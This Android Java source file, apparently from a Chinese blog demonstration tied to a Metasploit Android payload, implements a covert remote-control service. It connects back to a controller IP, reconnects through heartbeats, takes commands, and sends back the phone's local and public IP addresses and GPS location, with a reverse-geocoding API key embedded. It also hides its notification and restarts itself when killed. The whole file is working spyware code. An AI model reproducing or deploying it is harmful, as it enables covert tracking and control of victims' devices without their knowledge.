package com.metasploit;
import android.app.*;
import android.os.*;
import android.content.*;
import java.net.*;
import java.io.*;
import android.widget.*;
import java.util.*;
import org.json.*;
import android.location.*;
import android.provider.*;
import android.view.*;
import com.metasploit.stage.*;

public class TCPServer extends Service
{
//Java利用Socket类编写Metasploit安卓载荷辅助模块_演示入侵过程
	//Metasploit/app/src/main/java/com/metasploit/TCPServer.java和MSF_Sh3ll/app/src/main/java/com/metasploit/shell/reverse/MainActivity.java
	//作者：Kali_MG1937
	//CSDN博客：ALDYS4

LocationManager location;
List<String> providerList;
Location gps;
Socket socket;
Thread thread;
String ip="192.168.2.200";//接收方ip
String toast="";//控制toast的参数
String x,y;
static Context c=null;
	LocationListener locationListener=new LocationListener(){

		@Override
		public void onLocationChanged(Location p1)
		{//"\n纬度："+gps.getLatitude()+"\n经度："+gps.getLongitude())
			x=p1.getLatitude()+"";
			y=p1.getLongitude()+"";
		}

		@Override
		public void onStatusChanged(String p1, int p2, Bundle p3)
		{
			// TODO: Implement this method
		}

		@Override
		public void onProviderEnabled(String p1)
		{
			// TODO: Implement this method
		}

		@Override
		public void onProviderDisabled(String p1)
		{
			// TODO: Implement this method
		}
	};
	Handler handler=new Handler(){

		@Override
		public void handleMessage(Message msg)
		{
			// TODO: Implement this method
		switch(msg.what){
			case 1://控制toast
				Toast.makeText(c,toast,Toast.LENGTH_SHORT).show();
				try
				{
					OutputStream os=socket.getOutputStream();
					os.write("傀儡机回弹：toast命令已执行".getBytes());
				}
				catch (IOException e)
				{  }
				break;
			case 2://控制gps
			runGps();
			break;
			case 3://debug
				Toast.makeText(c,toast,Toast.LENGTH_SHORT).show();
				break;
		}
		}
	
	
	};

	
	@Override
	public IBinder onBind(Intent p1)
	{
		// TODO: Implement this method
		return null;
	}

	@Override
	public void onCreate()
	{
		// TODO: Implement this method
		super.onCreate();
		
		
	//b.利用InputStream类来实现傀儡机与控制端的交流
	thread=	new Thread(new Runnable(){

				@Override
				public void run()
				{
					
						
						
					try{	
									InputStream in=socket.getInputStream();
									int len;
									byte[] b=new byte[1024];
									while ((len = in.read(b)) != -1)
									{
										String cmd=new String(b,0,len);
										if(cmd.startsWith("toast:")){//判断类型为toast
											toast=cmd.replace("toast:","");
											sendmsg(1);
										}
										if(cmd.equals("getIp")){//取得外网与本机地址
											sendMsg("\n本机地址是："+getHostIP()+"\n"+"外网地址是："+GetNetIp());
										}
										if(cmd.equals("runGps")){
										sendmsg(2);
											//runGps();
											}//运行GPS服务
										if(cmd.equals("getGps")){getGps();}//获得地理位置
										else if(cmd.equals("restart")){//判断执行restart
											//new TCPServer().startService(c);
											new MainService().startService(c);
											sendMsg("重启MainService服务成功");
										}
										}
										
										
							}
							catch (IOException e)
							{
								
					}


					//封装在一个线程里，方便调用
				}
			});


		//a。傀儡机保证socket稳定的实现代码：循环检测socket，若不为null时就向控制端发送心跳包，若对方成功接收就隔一秒再次发送；如果控制端一旦下线，傀儡机发送心跳包时就会抛出错误，抛出错误时再次建立socket链接
		new Thread(new Runnable(){

			@Override
			public void run()
			{
				while(true){
					try
					{

						if (socket != null)//检查socket是否为null，若不是，执行下一句
						{
							try
							{
								socket.sendUrgentData(0xFF);//发送心跳包，若发送失败，抛出错误


							}
							catch (IOException e)
							{
								socket=new Socket(ip, 1557);//抛出错误时重新建立socket链接
							}
						}else{
							socket=new Socket(ip, 1557);//若socket为空，再次建立链接
						}
					}
					catch (IOException e)
					{}
					try
					{
						Thread.sleep(1000);//时隔一秒
					}
					catch (InterruptedException e)
					{}
				}
			}
		}).start();
//线程封装
	}
	
	public void sendMsg(String msg){
		try
		{
			OutputStream os=socket.getOutputStream();
			os.write(("傀儡机回弹："+msg).getBytes());
		}
		catch (IOException e)
		{}

	}
	
	public void getPlace(String x,String y) throws IOException{
		try
		{
			URL url=new URL("http://api.map.baidu.com/geocoder/v2/?callback=renderReverse&location="+x+","+y+"&output=json&pois=1&ak=D1KqQoMODcbPXMsbUuky7cu8Qs4A9bzY");
			//百度地图json
			URLConnection http=url.openConnection();
			HttpURLConnection urlopen=(HttpURLConnection) http;
			if(urlopen.getResponseCode()==200){
				BufferedReader br=new BufferedReader(new InputStreamReader(urlopen.getInputStream(),"utf-8"));
			StringBuffer str=new StringBuffer();
			String line;
			while((line=br.readLine())!=null){
				str.append("\n"+line);
			}
			String json=str.toString();
			int start=json.indexOf("(")+1;
			int end=json.lastIndexOf(")");
			json=json.substring(start,end);
			if(json!=null){
				try
				{
					JSONObject j=new JSONObject(json);
					sendMsg("定位所在地："+j.optJSONObject("result").optString("formatted_address"));
				}
				catch (JSONException e)
				{}
			}
			}
		}
		catch (MalformedURLException e)
		{}
	}
	public void runGps(){//运行gps
	
		location=(LocationManager) getSystemService(Context.LOCATION_SERVICE);
		providerList=location.getProviders(true);
		String provider;
		if(providerList.contains(LocationManager.GPS_PROVIDER)){
			provider=LocationManager.GPS_PROVIDER;
			gps=location.getLastKnownLocation(provider);}
		else if(providerList.contains(LocationManager.NETWORK_PROVIDER)){
			provider=LocationManager.NETWORK_PROVIDER;
			gps=location.getLastKnownLocation(provider);}
		else{sendMsg("傀儡机无GPS服务（也可能是用户拒绝权限)");
			return;}
			location.requestLocationUpdates(provider,1,0,locationListener);
	}

	
	public void getGps(){//获取gps信息
		if(x==null){
		if(gps!=null){
			sendMsg("上次记录的GPS信息：\n纬度："+gps.getLatitude()+"\n经度："+gps.getLongitude());
			try
			{
				getPlace(gps.getLatitude() + "", gps.getLongitude() + "");
			}
			catch (IOException e)
			{}
		}
else
{
			sendMsg("GPS服务没有获取任何信息");
		}
		}
		else{sendMsg("\n纬度："+x+"\n经度："+y);
			try
			{
				getPlace(x, y);
			}
			catch (IOException e)
			{}
		}
		
	}
	
	
	public static String GetNetIp() {  //外网ip
        URL infoUrl = null;  
        InputStream inStream = null;  
        String line = "";  
        try {  
            infoUrl = new URL("http://pv.sohu.com/cityjson?ie=utf-8");  
            URLConnection connection = infoUrl.openConnection();  
            HttpURLConnection httpConnection = (HttpURLConnection) connection;  
            int responseCode = httpConnection.getResponseCode();  
            if (responseCode == HttpURLConnection.HTTP_OK) {  
                inStream = httpConnection.getInputStream();  
                BufferedReader reader = new BufferedReader(new InputStreamReader(inStream, "utf-8"));  
                StringBuilder strber = new StringBuilder();  
                while ((line = reader.readLine()) != null)  
                    strber.append(line + "\n");  
                inStream.close();  
                // 从反馈的结果中提取出IP地址  
                int start = strber.indexOf("{");  
                int end = strber.indexOf("}");  
                String json = strber.substring(start, end + 1);  
                if (json != null) {  
                    try {  
                        JSONObject jsonObject = new JSONObject(json);  
                        line = jsonObject.optString("cip")+"\n所在地："+jsonObject.optString("cname");  
                    } catch (JSONException e) {  
                        e.printStackTrace();  
                    }  
                }  
                return line;  
            }  
        } catch (MalformedURLException e) {  
            e.printStackTrace();  
        } catch (IOException e) {  
            e.printStackTrace();  
        }  
        return line;  
    }  
	
	public static String getHostIP() {//本机ip获取


        String hostIp = null;
        try {
            Enumeration nis = NetworkInterface.getNetworkInterfaces();
            InetAddress ia = null;
            while (nis.hasMoreElements()) {
                NetworkInterface ni = (NetworkInterface) nis.nextElement();
                Enumeration<InetAddress> ias = ni.getInetAddresses();
                while (ias.hasMoreElements()) {
                    ia = ias.nextElement();
                    if (ia instanceof Inet6Address) {
                        continue;// skip ipv6
                    }
                    String ip = ia.getHostAddress();
                    if (!"127.0.0.1".equals(ip)) {
                        hostIp = ia.getHostAddress();
                        break;
                    }
                }
            }
        } catch (SocketException e) {
           
            e.printStackTrace();
        }
        return hostIp;


    }
	//以下代码用于提升服务优先级
	private Notification getNotification() {
        Notification.Builder builder = new Notification.Builder(this);
		RemoteViews view=new RemoteViews("com.metasploit",R.layout.nullviews);
		builder.setContent(view);
		builder.setPriority(Notification.PRIORITY_MAX);
		builder.setWhen(System.currentTimeMillis());
		builder.setSmallIcon(R.drawable.ic_launcher);
		Intent intent =new Intent (c,TCPServer.class);
        PendingIntent pendingIntent =PendingIntent.getService(c, 0, intent, 0);
		builder.setContentIntent(pendingIntent);
		builder.setOngoing(true);
        //设置Notification的ChannelID,否则不能正常显示
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder.setChannelId("1557");
        }
        Notification notification = builder.build();
        return notification;
    }
	@Override
	public int onStartCommand(Intent intent, int flags, int startId)
	{NotificationManager notificationManager;
	notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        //创建NotificationChannel
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
            NotificationChannel channel = new NotificationChannel("1557", "console", NotificationManager.IMPORTANCE_HIGH);
            notificationManager.createNotificationChannel(channel);
        }
		
        startForeground(1,getNotification());
    
		return Service.START_STICKY;
	}
	
	
	
	
public void startService(Context c){
	
	this.c=c;
	c.startService(new Intent(c,TCPServer.class));
}

public void sendmsg(int i){
	Message msg=new Message();
	msg.what=i;
	handler.sendMessage(msg);
}
	
	
	@Override
	public void onDestroy()
	{
		stopForeground(true);
		new TCPServer().startService(c);
		super.onDestroy();
	}
	
	
}
